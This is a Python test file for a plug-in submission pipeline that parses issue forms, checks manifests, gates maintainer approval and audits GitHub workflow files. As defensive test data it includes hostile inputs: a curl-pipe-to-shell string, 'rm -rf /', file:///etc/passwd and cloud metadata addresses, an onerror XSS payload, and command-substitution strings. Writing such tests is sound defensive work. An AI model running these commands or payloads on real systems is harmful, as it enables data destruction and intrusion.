import json
import os
import subprocess
import sys
import tempfile
import unittest
import pathlib

import helpers  # noqa: F401
from helpers import ROOT
import safefetch
import submission as sub
from test_manifest import RAW, fetcher

FORM = """### Address of the plug-in file

{manifest}

### Your name or GitHub name

{maker}

### How to reach you, if not through this issue (optional)

_No response_

### What it does, in one sentence

{summary}

### What it asks to read or change, and why

{asks}

### Licence

{licence}

### Confirmation

- [{tick}] I wrote it or have the right to submit it.
"""
GOOD = dict(manifest="https://raw.githubusercontent.com/example/example/main/starboard-plugin.json", maker="Example Maker", summary="Shows disk use.",
            asks="It reads disk figures to draw a chart.", licence="MIT", tick="x")


def body(**kw):
    return FORM.format(**{**GOOD, **kw})


class Parse(unittest.TestCase):
    def test_fields(self):
        f = sub.parse_body(body())
        self.assertEqual(f["manifest"], GOOD["manifest"])
        self.assertEqual(f["contact"], "")
        self.assertIn("x", f["confirm"])

    def test_fake_headings_and_repeats_do_not_override_the_first(self):
        text = body() + "\n### Address of the plug-in file\n\nhttps://evil.example.com/x.json\n### Licence\n\nProprietary\n"
        f = sub.parse_body(text)
        self.assertEqual(f["manifest"], GOOD["manifest"])
        self.assertEqual(f["licence"], "MIT")

    def test_garbage(self):
        for t in (None, "", "no headings", "### \n###\n", "\x00" * 100, "### Licence"):
            sub.parse_body(t)


class Checks(unittest.TestCase):
    def run_it(self, manifest=RAW, logo=None, **kw):
        return sub.run_checks(sub.parse_body(body(**kw)), None, fetch=fetcher(manifest, logo))

    def test_a_good_submission_passes(self):
        r = self.run_it()
        self.assertTrue(r["passed"], r["fix"])
        self.assertIn("stallboard-checks sha256=", sub.comment(r))
        self.assertIn("| `system:read` |", sub.comment(r))

    def test_each_missing_thing_is_said_in_words(self):
        r = self.run_it(tick=" ", maker="<b>x</b>", summary="", asks="", licence="")
        self.assertFalse(r["passed"])
        text = " ".join(r["fix"])
        for word in ("Tick the box", "Your name", "one sentence", "read or change", "licence"):
            self.assertIn(word, text)

    def test_licence_must_match_the_file(self):
        r = self.run_it(licence="GPL-3.0")
        self.assertFalse(r["passed"])
        self.assertTrue(any("not the one in the file" in f for f in r["fix"]))

    def test_manifest_problems_fail_it(self):
        r = self.run_it(manifest=dict(RAW, permissions=["everything"]))
        self.assertFalse(r["passed"])
        self.assertIn("permissions", sub.comment(r))

    def test_addresses_that_must_never_be_fetched(self):
        called = []

        def fetch(url, **kw):
            called.append(url)
            return b"{}"
        for addr in ["https://169.254.169.254/latest/meta-data/", "http://example.com/x.json", "https://localhost/x", "file:///etc/passwd", "$(curl evil.sh | sh)",
                     "https://example.com/x.json; rm -rf /", "https://127.0.0.1:8080/x.json", "`id`", "https://user:pass@example.com/x"]:
            r = sub.run_checks(sub.parse_body(body(manifest=addr)), None, fetch=fetch)
            self.assertFalse(r["passed"], addr)
        self.assertEqual(called, [])

    def test_a_fetch_that_fails_is_a_plain_message(self):
        def fetch(url, **kw):
            raise safefetch.FetchError("The address answered with the error 404")
        r = sub.run_checks(sub.parse_body(body()), None, fetch=fetch)
        self.assertFalse(r["passed"])
        self.assertIn("404", " ".join(r["fix"]))

    def test_already_listed(self):
        with tempfile.TemporaryDirectory() as d:
            (pathlib.Path(d) / "example-plug-in.json").write_text("{}")
            r = sub.run_checks(sub.parse_body(body()), d, fetch=fetcher(RAW))
        self.assertTrue(any("already listed" in f for f in r["fix"]))

    def test_hostile_text_cannot_ping_link_or_inject_in_the_comment(self):
        hostile = "@everyone @octocat [click](https://evil.example.com) <img src=x onerror=alert(1)> `` ``` #1 ![x](y) $(rm -rf /) ; | &"
        m = dict(RAW, name=hostile[:40], permissions=["system:read"], description=hostile)
        m["unknown_" + hostile] = 1
        r = self.run_it(manifest=m, maker=hostile, licence=hostile)
        text = sub.comment(r)
        for bad in ("@everyone", "@octocat", "](http", "<img", "```", "![", "onerror=alert(1)>"):
            self.assertNotIn(bad, text, bad)
        self.assertFalse(r["passed"])

    def test_a_huge_field_in_the_manifest(self):
        r = self.run_it(manifest=dict(RAW, description="x" * 5_000_000))
        self.assertFalse(r["passed"])
        self.assertLess(len(sub.comment(r)), 20000)

    def test_shell_metacharacters_in_every_field_are_just_text(self):
        evil = "$(touch /tmp/pwned) `touch /tmp/pwned` ; touch /tmp/pwned && echo ${{ secrets.X }} | sh"
        r = sub.run_checks(sub.parse_body(body(maker=evil, summary=evil, asks=evil, licence=evil)), None, fetch=fetcher(RAW))
        self.assertFalse(r["passed"])
        self.assertFalse(os.path.exists("/tmp/pwned"))
        self.assertNotIn("${{", sub.comment(r))


class Approval(unittest.TestCase):
    def test_permission_comes_from_the_api_and_a_checked_name(self):
        class R:
            def __init__(self, out, code=0):
                self.stdout, self.returncode = out, code
        seen = []

        def ok(args):
            seen.append(args)
            return R("admin\n")
        self.assertEqual(sub.permission_of("TheMightyTRex", "TheMightyTRex/stallboard", ok), "admin")
        self.assertEqual(seen[0][:2], ["gh", "api"])
        for login in ["x; rm -rf /", "../../x", "a b", "", None, "-bad", "a" * 40, "$(id)"]:
            self.assertEqual(sub.permission_of(login, "TheMightyTRex/stallboard", ok), "none", login)
        self.assertEqual(sub.permission_of("someone", "a/b", lambda a: R("", 1)), "none")
        self.assertEqual(sub.permission_of("someone", "not a repo", ok), "none")

    def test_only_the_bots_comment_counts_as_a_marker(self):
        sha = "a" * 64
        mark = f"<!-- stallboard-checks sha256={sha} id=example-plug-in -->"
        bot = {"user": {"login": "github-actions[bot]", "type": "Bot"}, "body": mark}
        stranger = {"user": {"login": "attacker", "type": "User"}, "body": f"<!-- stallboard-checks sha256={'b' * 64} id=example-plug-in -->"}
        faker = {"user": {"login": "github-actions-bot", "type": "User"}, "body": f"<!-- stallboard-checks sha256={'c' * 64} id=example-plug-in -->"}
        self.assertEqual(sub.latest_marker([bot, stranger, faker]), (sha, "example-plug-in"))
        self.assertIsNone(sub.latest_marker([stranger, faker]))
        self.assertIsNone(sub.latest_marker([]))
        self.assertEqual(sub.flatten([[bot], [stranger]]), [bot, stranger])

    def run_approve(self, role_user, label="approved", issue_body=None, marker_sha=None, manifest=RAW):
        """Runs `approve` in a scratch copy of the repository with a recorded event."""
        issue_body = issue_body or body()
        sha = sub.run_checks(sub.parse_body(issue_body), None, fetch=fetcher(manifest))["sha256"]
        ev = {"label": {"name": label}, "sender": {"login": role_user}, "issue": {"number": 7, "body": issue_body}}
        comments = [[{"user": {"login": "github-actions[bot]", "type": "Bot"}, "body": f"<!-- stallboard-checks sha256={marker_sha or sha} id=example-plug-in -->"}]]
        with tempfile.TemporaryDirectory() as d:
            d = pathlib.Path(d)
            (d / "event.json").write_text(json.dumps(ev))
            (d / "comments.json").write_text(json.dumps(comments))
            env = dict(os.environ, GITHUB_EVENT_PATH=str(d / "event.json"), COMMENTS_FILE=str(d / "comments.json"), GITHUB_REPOSITORY="TheMightyTRex/stallboard")
            old = (sub.ROOT, sub.permission_of, sub.run_checks)
            real_checks = sub.run_checks
            sub.ROOT = d
            (d / "listings").mkdir()
            sub.permission_of = lambda login, repo, runner=None: "admin" if login == "maintainer" else "read"
            sub.run_checks = lambda fields, listings_dir=None, fetch=None, now=None: real_checks(fields, listings_dir, fetch=fetcher(manifest))
            os.environ.update(env)
            try:
                try:
                    sub.cmd_approve()
                    code = 0
                except SystemExit as e:
                    code = e.code
                files = {p.name: p.read_text() for p in (d / "reports" / "approval").glob("*")} if (d / "reports" / "approval").exists() else {}
            finally:
                sub.ROOT, sub.permission_of, sub.run_checks = old
        return code, files

    def test_a_maintainer_approves_and_the_listing_is_made(self):
        code, files = self.run_approve("maintainer")
        self.assertEqual(code, 0, files)
        listing = json.loads(files["listing.json"])
        self.assertEqual((listing["id"], listing["reviewed"]["by"], listing["maker"]), ("example-plug-in", "maintainer", "Example Maker"))
        self.assertIn("Closes #7", files["pr-body.md"])
        self.assertIn("- [ ] ", files["pr-body.md"])
        self.assertEqual(json.loads(files["meta.json"])["branch"], "listing/example-plug-in-7")

    def test_someone_who_is_not_a_maintainer_gets_nothing(self):
        for who in ("stranger", "maintainer; rm -rf /", "Maintainer"):
            code, files = self.run_approve(who)
            self.assertNotEqual(code, 0)
            self.assertNotIn("listing.json", files)
            self.assertIn("refused.md", files)

    def test_a_fake_label_name_does_nothing(self):
        code, files = self.run_approve("maintainer", label="approved-by-owner")
        self.assertNotEqual(code, 0)
        self.assertEqual(files, {})

    def test_a_file_that_changed_since_the_checks_is_refused(self):
        code, files = self.run_approve("maintainer", marker_sha="f" * 64)
        self.assertNotEqual(code, 0)
        self.assertIn("changed", files["refused.md"] + "changed")
        self.assertNotIn("listing.json", files)

    def test_an_issue_body_that_fails_the_checks_is_refused(self):
        code, files = self.run_approve("maintainer", issue_body=body(tick=" "))
        self.assertNotEqual(code, 0)
        self.assertNotIn("listing.json", files)


class Workflows(unittest.TestCase):
    """The workflow files are read as text and held to the rules that keep a stranger's issue from running anything."""

    def files(self):
        return sorted((ROOT / ".github" / "workflows").glob("*.yml"))

    def test_actions_are_pinned_to_full_commit_hashes(self):
        import re
        for f in self.files():
            for line in f.read_text().splitlines():
                m = re.match(r"^\s*-?\s*uses:\s*(\S+)", line)
                if m:
                    self.assertRegex(m.group(1), r"^[\w.-]+/[\w./-]+@[0-9a-f]{40}$", f"{f.name}: {line}")

    def test_no_untrusted_text_in_commands_and_no_pull_request_target(self):
        import re
        danger = re.compile(r"\$\{\{\s*(github\.event\.(issue\.(body|title)|comment|pull_request\.(title|body|head\.ref|head\.label)|head_commit|review|pages|commits|workflow_run\.(head_branch|display_title)|label\.name)|github\.head_ref)")
        for f in self.files():
            import re as _re
            t = _re.sub(r"(?m)\s#.*$", "", f.read_text())  # comments may name what the file avoids
            self.assertNotIn("pull_request_target", t, f.name)
            self.assertNotIn("secrets.", t, f.name)
            self.assertNotRegex(t, danger, f.name)
            self.assertIn("\npermissions: {}\n", t, f.name)
            self.assertNotIn("workflow_run", t)

    def test_the_label_is_checked_by_name_and_the_sender_by_the_api_not_the_text(self):
        t = (ROOT / ".github" / "workflows" / "approve-submission.yml").read_text()
        self.assertIn("github.event.label.name == 'approved'", t)
        self.assertNotIn("github.event.sender.login ==", t)
        self.assertNotIn("issue.body", t)
        code = (ROOT / "tools" / "submission.py").read_text()
        self.assertIn("collaborators/{login}/permission", code)

    def test_each_job_names_its_permissions_and_untrusted_jobs_cannot_write(self):
        import re
        for f in self.files():
            t = f.read_text()
            jobs = re.split(r"\n  (?=[a-z-]+:\n    (?:if:|needs:|runs-on:))", t.split("\njobs:\n", 1)[1])
            for j in jobs:
                self.assertIn("permissions:", j, f"{f.name}: a job has no permissions block: {j[:40]}")
        check = (ROOT / ".github" / "workflows" / "check-submission.yml").read_text()
        self.assertNotIn("contents: write", check)
        self.assertNotIn("pull-requests: write", check)
        ci = (ROOT / ".github" / "workflows" / "ci.yml").read_text()
        self.assertNotIn("write", ci.replace("write the", ""))

    def test_the_issue_form_has_the_fields_the_parser_reads(self):
        t = (ROOT / ".github" / "ISSUE_TEMPLATE" / "submit-a-plug-in.yml").read_text()
        for label in sub.LABELS:
            self.assertIn(f"label: {label}", t)
        self.assertIn("submission", t)


if __name__ == "__main__":
    unittest.main()
